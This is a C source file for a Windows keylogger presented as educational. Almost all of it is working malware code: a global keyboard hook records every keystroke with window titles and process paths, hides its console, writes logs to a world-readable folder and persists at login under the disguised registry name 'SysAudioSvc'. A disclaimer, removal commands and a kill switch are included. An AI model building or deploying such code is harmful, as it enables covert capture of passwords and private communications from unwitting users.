/*
 * keylogger_demo.c  --  Win32 Educational Keylogger (Advanced)
 * Coded by Egyan
 *
 * ============================================================
 * WIN32 APIS DEMONSTRATED IN THIS FILE
 * ============================================================
 *
 *  [1]  SetWindowsHookEx(WH_KEYBOARD_LL)
 *           Installs a global low-level keyboard hook.
 *           The callback fires for every key event system-wide,
 *           regardless of which process has focus.
 *           Thread ID = 0 means "global" (all threads).
 *
 *  [2]  ToUnicode() / GetKeyboardState()
 *           The CORRECT way to convert a virtual key code to a
 *           character.  Handles dead keys (e.g. ^ + e = e-hat),
 *           international keyboard layouts, CapsLock, and Shift
 *           automatically -- without a 80-line manual switch.
 *           Dead key fix: when ToUnicodeEx returns -1 (dead key
 *           consumed from internal buffer), call it again with the
 *           same args to restore the buffered dead key state so the
 *           NEXT key event still produces the combined glyph.
 *           Compare to vk_to_string() in the basic version.
 *
 *  [3]  GetWindowTextW() + WideCharToMultiByte()
 *           Unicode-safe window title retrieval.
 *           The A (ANSI) variant silently truncates non-ASCII
 *           characters.  The W (Wide) variant preserves them,
 *           then we convert to UTF-8 for logging.
 *
 *  [4]  GetWindowThreadProcessId() + QueryFullProcessImageNameA()
 *           Two-step pattern to get the executable path from a
 *           window handle (HWND):
 *             HWND -> thread/PID -> process handle -> image path
 *           OpenProcess needs PROCESS_QUERY_LIMITED_INFORMATION,
 *           a least-privilege flag introduced in Vista.
 *
 *  [5]  CreateMutexA() + GetLastError() == ERROR_ALREADY_EXISTS
 *           Single-instance guard.  A named mutex is visible
 *           kernel-wide; trying to create it twice returns
 *           ERROR_ALREADY_EXISTS so the second instance exits.
 *
 *  [6]  RegisterHotKey() + WM_HOTKEY in the message loop
 *           Registers a global hotkey that fires even when this
 *           process is not in focus.  Used here as a lab kill
 *           switch (Ctrl+Shift+F12).  Notice it posts WM_HOTKEY
 *           to the thread message queue -- not a callback.
 *
 *  [7]  GetComputerNameA() / GetUserNameA()
 *           Retrieve the NetBIOS machine name and logged-on
 *           user name.  Written to the session header in the
 *           log so you know which machine produced each log.
 *
 *  [8]  RegSetValueExA() to HKCU\...\Run
 *           User-space persistence.  HKCU does not require
 *           elevation (unlike HKLM).  Windows reads this key
 *           on every interactive login.
 *
 *  [9]  WideCharToMultiByte(CP_UTF8, ...)
 *           Converts UTF-16 wide strings to UTF-8 byte strings.
 *           Essential for logging Unicode window titles correctly.
 *
 * ============================================================
 * BUILD
 * ============================================================
 *
 *  Release (no console window):
 *    x86_64-w64-mingw32-gcc -Wall -Wextra -O2 keylogger_demo.c \
 *      -o keylogger_demo.exe -mwindows -luser32 -ladvapi32 -lkernel32
 *
 *  Debug (console window visible -- useful for testing):
 *    x86_64-w64-mingw32-gcc -Wall -g keylogger_demo.c \
 *      -o keylogger_demo_debug.exe -luser32 -ladvapi32 -lkernel32
 *
 * ============================================================
 * REMOVAL
 * ============================================================
 *
 *  reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysAudioSvc" /f
 *  rmdir /s /q C:\Users\Public\logs
 *  del keylogger_demo.exe
 *
 * ============================================================
 * DISCLAIMER
 * ============================================================
 *
 *  FOR EDUCATIONAL USE ONLY.  Only deploy on machines you own
 *  or have EXPLICIT WRITTEN AUTHORISATION to test.
 *  Unauthorised use is illegal (Computer Misuse Act 1990 (UK),
 *  CFAA (US), and equivalent laws worldwide).
 *  See detector.c for how security tools detect this.
 *
 * Coded by Egyan
 */

/* ── Suppress deprecation warnings for GetVersionExA ──────── */
#define _WIN32_WINNT 0x0600   /* Vista+ for QueryFullProcessImageNameA */

#include <windows.h>
#include <psapi.h>      /* GetModuleFileNameExA (alternative path) */
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <wchar.h>

/* ============================================================
 *  CONFIGURATION  --  edit these to change behaviour
 * ============================================================ */

/* Disguised registry value name for persistence */
#define REGISTRY_KEY        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE_NAME "SysAudioSvc"

/* Log output directory (world-readable for easy lab access) */
#define LOG_DIR             "C:\\Users\\Public\\logs\\"

/* Named mutex -- ensures only one copy of this process runs */
#define MUTEX_NAME          "Global\\SysAudioSvc_EgyanLab_2025"

/* Kill switch hotkey: Ctrl+Shift+F12 -- useful in a lab/classroom */
#define KILL_HOTKEY_ID      1
#define KILL_HOTKEY_MODS    (MOD_CONTROL | MOD_SHIFT)
#define KILL_HOTKEY_VK      VK_F12

/* Buffer sizes */
#define MAX_PATH_LEN        512
#define MAX_TITLE_LEN       512
#define MAX_PROC_LEN        512
#define MAX_KEY_UTF8        16    /* Max UTF-8 bytes from one key press */


/* ============================================================
 *  GLOBALS
 * ============================================================ */

static HHOOK  g_hook          = NULL;
static FILE  *g_logfile       = NULL;
static char   g_log_date[16]  = {0};

/* Track last window to avoid flooding the log with repeated headers */
static wchar_t g_last_title[MAX_TITLE_LEN] = {0};
static char    g_last_proc[MAX_PROC_LEN]   = {0};

static HANDLE  g_mutex        = NULL;


/* ============================================================
 *  FORWARD DECLARATIONS
 * ============================================================ */

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

/* Log file management */
static void open_log_for_today(void);
static void write_session_header(void);
static void write_window_context(const wchar_t *title, const char *proc);

/* Key translation */
static int  translate_vk_to_utf8(DWORD vkCode, DWORD scanCode,
                                  char *outBuf, int outLen);
static const char *special_key_label(DWORD vk);

/* Window/process helpers */
static void get_window_title_w(HWND hwnd, wchar_t *buf, int cchBuf);
static void get_process_path(HWND hwnd, char *buf, int bufLen);

/* Persistence */
static void install_persistence(void);

/* Single instance */
static BOOL is_already_running(void);


/* ============================================================
 *  ENTRY POINT
 *
 *  WinMain instead of main() -- required when linking with
 *  -mwindows (no console subsystem).  Parameters are ignored
 *  here but must match the expected signature.
 * ============================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* [1] Single-instance check via named mutex.
     *     If another copy is already running, exit silently. */
    if (is_already_running()) return 0;

    /* [2] Create log directory and open today's log file */
    CreateDirectoryA(LOG_DIR, NULL);
    open_log_for_today();

    /* [3] Write session header -- machine, user, OS, timestamp */
    write_session_header();

    /* [4] Registry persistence -- auto-start on login */
    install_persistence();

    /* [5] Register kill switch hotkey (Ctrl+Shift+F12).
     *     This lets you cleanly terminate the process from a
     *     classroom scenario without Task Manager.
     *     NULL hWnd = post to thread message queue. */
    RegisterHotKey(NULL, KILL_HOTKEY_ID, KILL_HOTKEY_MODS, KILL_HOTKEY_VK);

    /* [6] Install the low-level keyboard hook.
     *
     *     WH_KEYBOARD_LL:  intercepts keyboard events globally.
     *     hMod = NULL:     hook runs in THIS process's context.
     *                      For LL hooks (keyboard and mouse),
     *                      hMod must be NULL and dwThreadId = 0.
     *     dwThreadId = 0:  hook applies to all threads / all apps.
     *
     *     IMPORTANT: The message pump below is mandatory.
     *     Windows delivers LL hook events by posting messages
     *     to this thread's queue.  Without GetMessage running,
     *     the hook silently stops firing after ~5 seconds
     *     (Windows times out unresponsive hooks). */
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!g_hook) {
        if (g_logfile) fclose(g_logfile);
        ReleaseMutex(g_mutex);
        CloseHandle(g_mutex);
        return 1;
    }

    /* [7] Message pump.
     *
     *     GetMessage blocks until a message arrives.
     *     We handle WM_HOTKEY here for the kill switch.
     *     All other messages are dispatched normally -- the hook
     *     callback fires in response to WM_KEYDOWN messages
     *     that Windows posts when a key event is intercepted. */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        /* Kill switch -- Ctrl+Shift+F12 */
        if (msg.message == WM_HOTKEY && msg.wParam == KILL_HOTKEY_ID) {
            if (g_logfile) {
                fprintf(g_logfile, "\n\n[Kill switch activated. Exiting.]\n");
                fflush(g_logfile);
            }
            PostQuitMessage(0);
            continue;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    /* [8] Cleanup */
    UnhookWindowsHookEx(g_hook);
    UnregisterHotKey(NULL, KILL_HOTKEY_ID);
    if (g_logfile) {
        fprintf(g_logfile, "\n[Session ended]\n");
        fclose(g_logfile);
    }
    ReleaseMutex(g_mutex);
    CloseHandle(g_mutex);

    return 0;
}


/* ============================================================
 *  KEYBOARD HOOK CALLBACK
 *
 *  Windows calls this for every key event system-wide.
 *
 *  nCode:  >= 0 means process the event; < 0 means pass it on.
 *  wParam: message type -- WM_KEYDOWN, WM_KEYUP, etc.
 *  lParam: pointer to KBDLLHOOKSTRUCT with key details.
 *
 *  RULES:
 *  - We must call CallNextHookEx() at the end, always.
 *    Failing to do so breaks the hook chain and may cause
 *    keys to stop being delivered to other applications.
 *  - Keep this callback FAST.  If it takes too long,
 *    Windows will remove the hook automatically.
 * ============================================================ */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode   = kb->vkCode;
        DWORD scanCode = kb->scanCode;

        /* Rotate log file if it's a new day */
        open_log_for_today();

        /* ── Detect active window / process change ──
         *
         * GetForegroundWindow() returns the window that currently
         * has keyboard focus.  We compare against the last logged
         * window to avoid repeating the header on every keystroke.
         *
         * We use the Wide (W) variants to handle non-ASCII window
         * titles (e.g. Japanese/Arabic app names). */
        HWND fg = GetForegroundWindow();
        if (fg) {
            wchar_t current_title[MAX_TITLE_LEN] = {0};
            char    current_proc[MAX_PROC_LEN]   = {0};

            get_window_title_w(fg, current_title, MAX_TITLE_LEN);
            get_process_path(fg, current_proc, MAX_PROC_LEN);

            if (wcscmp(current_title, g_last_title) != 0 ||
                strcmp(current_proc, g_last_proc) != 0)
            {
                wcscpy_s(g_last_title, MAX_TITLE_LEN, current_title);
                strncpy(g_last_proc, current_proc, MAX_PROC_LEN - 1);
                write_window_context(current_title, current_proc);
            }
        }

        /* ── Translate virtual key to UTF-8 character ──
         *
         * Special keys (Enter, Backspace, arrows, F-keys etc.)
         * don't map to printable characters.  Check those first.
         *
         * For everything else, ToUnicode() converts the VK code
         * to a Unicode character respecting the current keyboard
         * layout, CapsLock, Shift, dead keys, and AltGr. */
        const char *special = special_key_label(vkCode);
        if (special) {
            if (g_logfile) {
                fputs(special, g_logfile);
                fflush(g_logfile);
            }
        } else {
            char utf8[MAX_KEY_UTF8] = {0};
            int  len = translate_vk_to_utf8(vkCode, scanCode, utf8, MAX_KEY_UTF8);
            if (len > 0 && g_logfile) {
                fwrite(utf8, 1, len, g_logfile);
                fflush(g_logfile);
            }
        }
    }

    /* Always pass events to the next hook in the chain.
     * The 'g_hook' parameter is ignored for LL hooks on Vista+
     * but must be passed for compatibility. */
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}


/* ============================================================
 *  KEY TRANSLATION -- ToUnicode()
 *
 *  ToUnicode() is the Win32-correct way to translate a virtual
 *  key code to a Unicode character.  It is far superior to a
 *  manual switch statement because:
 *
 *    - It respects the CURRENT keyboard layout (US, UK, FR, DE,
 *      Arabic, Japanese, etc.) automatically.
 *    - It handles dead keys: e.g. ^ key followed by 'e' gives 'e-hat'.
 *    - It handles AltGr for symbols like @ on European keyboards.
 *    - It handles CapsLock and all Shift combinations.
 *
 *  CAVEAT: Calling ToUnicodeEx() with wFlags=0 consumes any pending
 *  dead key from the internal keyboard state buffer.  Example:
 *    User presses ^ (dead key) -- ToUnicodeEx returns -1, state buffered.
 *    User presses e           -- ToUnicodeEx should return U+00EA (e-hat).
 *  But if an unrelated key event (e.g. Shift release) also calls
 *  ToUnicodeEx before the 'e', it drains the dead key and 'e' logs as 'e'.
 *
 *  FIX (Win7-compatible double-call approach):
 *    After a result of -1 (dead key detected), call ToUnicodeEx a second
 *    time with the SAME arguments to push the dead key back into the
 *    internal buffer, restoring state as if the first call never happened.
 *    On Win8+ you can pass wFlags=4 (KEYEVENTF_UNICODE) to get this
 *    behaviour automatically, but the double-call works on Vista/7 too.
 *
 *  Returns the number of UTF-8 bytes written to outBuf.
 * ============================================================ */
static int translate_vk_to_utf8(DWORD vkCode, DWORD scanCode,
                                  char *outBuf, int outLen)
{
    /* Get the full 256-key state array.
     * This encodes which keys are currently held down,
     * toggled (CapsLock, NumLock) etc. */
    BYTE keyState[256] = {0};
    if (!GetKeyboardState(keyState)) return 0;

    WCHAR wbuf[4] = {0};
    HKL   layout = GetKeyboardLayout(0);  /* Current thread's keyboard layout */

    /* ToUnicode converts a VK + scan code + key state to Unicode.
     * wFlags = 0: consumes dead key state (side-effect we must handle).
     * Returns: -1 = dead key buffered, 0 = no translation, >0 = characters. */
    int result = ToUnicodeEx((UINT)vkCode, (UINT)scanCode,
                              keyState, wbuf, 4, 0, layout);

    if (result == -1) {
        /* Dead key was consumed from the internal buffer.
         * Call again immediately with the same args to push it back,
         * so the NEXT key event (e.g. 'e' after '^') still gets
         * the combined character (e-hat) rather than a bare 'e'. */
        ToUnicodeEx((UINT)vkCode, (UINT)scanCode,
                    keyState, wbuf, 4, 0, layout);
        return 0;  /* Don't log the dead key itself -- it has no glyph */
    }

    if (result <= 0) return 0;  /* No translation */

    /* Convert UTF-16 to UTF-8 for the log file. */
    int bytes = WideCharToMultiByte(CP_UTF8, 0,
                                     wbuf, result,
                                     outBuf, outLen - 1,
                                     NULL, NULL);
    if (bytes > 0) outBuf[bytes] = '\0';
    return bytes;
}


/* ============================================================
 *  SPECIAL KEY LABELS
 *
 *  Keys that don't produce printable characters get a label
 *  in square brackets.  ToUnicode() returns 0 for these, so
 *  we check them separately before attempting translation.
 *
 *  Returns a label string, or NULL if the key is printable.
 * ============================================================ */
static const char *special_key_label(DWORD vk)
{
    switch (vk) {
        /* Control keys */
        case VK_RETURN:    return "[ENTER]\n";
        case VK_BACK:      return "[BACK]";
        case VK_TAB:       return "[TAB]";
        case VK_ESCAPE:    return "[ESC]";
        case VK_DELETE:    return "[DEL]";
        case VK_INSERT:    return "[INS]";

        /* Navigation */
        case VK_LEFT:      return "[<]";
        case VK_RIGHT:     return "[>]";
        case VK_UP:        return "[^]";
        case VK_DOWN:      return "[v]";
        case VK_HOME:      return "[HOME]";
        case VK_END:       return "[END]";
        case VK_PRIOR:     return "[PGUP]";
        case VK_NEXT:      return "[PGDN]";

        /* Toggle keys */
        case VK_CAPITAL:   return "[CAPS]";
        case VK_NUMLOCK:   return "[NUMLOCK]";
        case VK_SCROLL:    return "[SCRLK]";

        /* Modifier keys -- don't log bare presses */
        case VK_LSHIFT:
        case VK_RSHIFT:    return "";
        case VK_LCONTROL:
        case VK_RCONTROL:  return "";
        case VK_LMENU:
        case VK_RMENU:     return "";
        case VK_LWIN:
        case VK_RWIN:      return "[WIN]";

        /* Function keys */
        case VK_F1:        return "[F1]";
        case VK_F2:        return "[F2]";
        case VK_F3:        return "[F3]";
        case VK_F4:        return "[F4]";
        case VK_F5:        return "[F5]";
        case VK_F6:        return "[F6]";
        case VK_F7:        return "[F7]";
        case VK_F8:        return "[F8]";
        case VK_F9:        return "[F9]";
        case VK_F10:       return "[F10]";
        case VK_F11:       return "[F11]";
        case VK_F12:       return "[F12]";

        /* Misc */
        case VK_SNAPSHOT:  return "[PRTSC]";
        case VK_PAUSE:     return "[PAUSE]";
        case VK_APPS:      return "[MENU]";

        default:           return NULL;  /* Printable -- use ToUnicode */
    }
}


/* ============================================================
 *  WINDOW TITLE (WIDE)
 *
 *  GetWindowTextW() retrieves the title in UTF-16.
 *  This correctly handles non-ASCII titles (e.g. a browser tab
 *  showing a Japanese or Arabic website title) which the ANSI
 *  variant GetWindowTextA() would silently corrupt.
 * ============================================================ */
static void get_window_title_w(HWND hwnd, wchar_t *buf, int cchBuf)
{
    if (!hwnd || !buf) return;
    buf[0] = L'\0';
    GetWindowTextW(hwnd, buf, cchBuf);
}


/* ============================================================
 *  PROCESS PATH FROM WINDOW HANDLE
 *
 *  Pattern taught here:
 *    HWND -> PID -> HANDLE -> image path
 *
 *  Step 1: GetWindowThreadProcessId(hwnd, &pid)
 *    Retrieves the thread ID (return value) and process ID (out
 *    param) that created the given window.
 *
 *  Step 2: OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, ...)
 *    Opens a handle to the process.  We request the LEAST
 *    PRIVILEGE right that still allows querying the image name.
 *    PROCESS_QUERY_INFORMATION would also work but requires
 *    higher trust.
 *
 *  Step 3: QueryFullProcessImageNameA(hProc, 0, buf, &size)
 *    Returns the full Win32 path to the .exe.  Available
 *    Vista+.  The 'dwFlags=0' variant returns a Win32 path
 *    (not the native NT path).
 *
 *  Step 4: CloseHandle(hProc)
 *    Release the handle immediately -- never leak handles.
 * ============================================================ */
static void get_process_path(HWND hwnd, char *buf, int bufLen)
{
    if (!hwnd || !buf) return;
    buf[0] = '\0';

    /* Step 1: Get PID from the window handle */
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (!pid) {
        strncpy(buf, "(unknown-pid)", bufLen - 1);
        return;
    }

    /* Step 2: Open the process with minimal rights */
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        /* Could fail if it's a protected system process (LSASS, csrss, etc.) */
        strncpy(buf, "(access-denied)", bufLen - 1);
        return;
    }

    /* Step 3: Query the full executable path */
    DWORD size = (DWORD)bufLen;
    if (!QueryFullProcessImageNameA(hProc, 0, buf, &size)) {
        strncpy(buf, "(query-failed)", bufLen - 1);
    }

    /* Step 4: Release handle */
    CloseHandle(hProc);
}


/* ============================================================
 *  LOG FILE MANAGEMENT
 *
 *  Log files are named keylog_YYYY-MM-DD.txt and created fresh
 *  each day.  Opened in append mode so restarts don't lose data.
 *
 *  open_log_for_today() is called on every keystroke.  It
 *  compares today's date string against g_log_date; if they
 *  differ, it closes the old file and opens a new one.
 * ============================================================ */
static void open_log_for_today(void)
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    char today[16];
    snprintf(today, sizeof(today), "%04d-%02d-%02d",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);

    /* Already on the right file -- nothing to do */
    if (g_logfile && strcmp(today, g_log_date) == 0) return;

    /* Close previous day's file */
    if (g_logfile) {
        char timebuf[32];
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", t);
        fprintf(g_logfile, "\n\n[Day ended: %s]\n", timebuf);
        fclose(g_logfile);
        g_logfile = NULL;
    }

    /* Build log file path: C:\Users\Public\logs\keylog_2025-01-15.txt */
    char path[MAX_PATH_LEN];
    snprintf(path, sizeof(path), "%skeylog_%s.txt", LOG_DIR, today);
    strncpy(g_log_date, today, sizeof(g_log_date) - 1);

    /* Open in append + binary mode.  Binary prevents Windows from
     * converting \n to \r\n, which would corrupt UTF-8 sequences. */
    g_logfile = fopen(path, "ab");
}


/* ============================================================
 *  SESSION HEADER
 *
 *  Written once when the process starts.  Records:
 *    - Timestamp
 *    - Machine name (NetBIOS, via GetComputerNameA)
 *    - Logged-on username (via GetUserNameA)
 *
 *  This gives forensic context to log files: you always know
 *  which machine and user they came from.
 * ============================================================ */
static void write_session_header(void)
{
    if (!g_logfile) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timebuf[32];
    strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", t);

    /* GetComputerNameA: NetBIOS name, up to MAX_COMPUTERNAME_LENGTH+1 chars */
    char machine[MAX_COMPUTERNAME_LENGTH + 2] = {0};
    DWORD mlen = sizeof(machine);
    GetComputerNameA(machine, &mlen);

    /* GetUserNameA: account name of the current user */
    char username[256] = {0};
    DWORD ulen = sizeof(username);
    GetUserNameA(username, &ulen);

    /* Write UTF-8 BOM so text editors open the file in the right encoding */
    fwrite("\xEF\xBB\xBF", 1, 3, g_logfile);

    fprintf(g_logfile,
        "\n"
        "================================================================\n"
        " GhostKey Session Log\n"
        " Timestamp : %s\n"
        " Machine   : %s\n"
        " User      : %s\n"
        " Kill sw.  : Ctrl+Shift+F12\n"
        "================================================================\n\n",
        timebuf,
        machine[0] ? machine : "(unknown)",
        username[0] ? username : "(unknown)");
    fflush(g_logfile);
}


/* ============================================================
 *  WINDOW CONTEXT HEADER
 *
 *  Written whenever the user switches to a different window.
 *  Logs:
 *    - Timestamp (HH:MM:SS)
 *    - Window title (UTF-8 converted from wide)
 *    - Process path (full .exe path)
 *
 *  Example:
 *    [14:32:07] > chrome.exe
 *               > Gmail - Inbox - Google Chrome
 * ============================================================ */
static void write_window_context(const wchar_t *title, const char *proc)
{
    if (!g_logfile) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timebuf[16];
    strftime(timebuf, sizeof(timebuf), "%H:%M:%S", t);

    /* Convert wide title to UTF-8 for the log */
    char title_utf8[MAX_TITLE_LEN * 3] = {0};  /* UTF-8 can be 3x wider */
    if (title && title[0]) {
        WideCharToMultiByte(CP_UTF8, 0,
                            title, -1,
                            title_utf8, sizeof(title_utf8) - 1,
                            NULL, NULL);
    } else {
        strncpy(title_utf8, "(no title)", sizeof(title_utf8) - 1);
    }

    fprintf(g_logfile,
        "\n\n[%s] >>> %s\n"
        "          >>> %s\n",
        timebuf,
        proc[0] ? proc : "(unknown)",
        title_utf8);
    fflush(g_logfile);
}


/* ============================================================
 *  REGISTRY PERSISTENCE
 *
 *  Writes this executable's full path to HKCU\...\Run so
 *  Windows auto-launches it on every login.
 *
 *  Why HKCU (Current User) instead of HKLM (Local Machine)?
 *    HKLM requires admin/SYSTEM rights to write.
 *    HKCU only requires the current user's rights -- always
 *    writable without elevation.  A less privileged but very
 *    reliable persistence mechanism.
 *
 *  Flow:
 *    RegOpenKeyExA  -> get a handle to the Run key
 *    RegSetValueExA -> write our exe path as a REG_SZ value
 *    RegCloseKey    -> release the handle
 * ============================================================ */
static void install_persistence(void)
{
    char exe_path[MAX_PATH_LEN] = {0};
    GetModuleFileNameA(NULL, exe_path, MAX_PATH_LEN);

    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        REGISTRY_KEY,
        0,
        KEY_SET_VALUE,
        &hKey
    );
    if (result != ERROR_SUCCESS) return;

    RegSetValueExA(
        hKey,
        REGISTRY_VALUE_NAME,
        0,
        REG_SZ,
        (BYTE *)exe_path,
        (DWORD)(strlen(exe_path) + 1)
    );

    RegCloseKey(hKey);
}


/* ============================================================
 *  SINGLE-INSTANCE GUARD
 *
 *  CreateMutexA with a "Global\" prefix creates a mutex in
 *  the global kernel namespace, visible across all sessions.
 *
 *  If a mutex with that name already exists, GetLastError()
 *  returns ERROR_ALREADY_EXISTS -- another instance is running.
 *
 *  g_mutex stays open for the lifetime of the process.
 *  When the process exits, the OS automatically closes the
 *  handle and destroys the mutex if no other handles remain.
 *
 *  bInitialOwner = TRUE means this thread owns it immediately
 *  if creation succeeded (not just opened an existing one).
 * ============================================================ */
static BOOL is_already_running(void)
{
    g_mutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (!g_mutex) return FALSE;                       /* Fallthrough on failure */
    return (GetLastError() == ERROR_ALREADY_EXISTS);
}
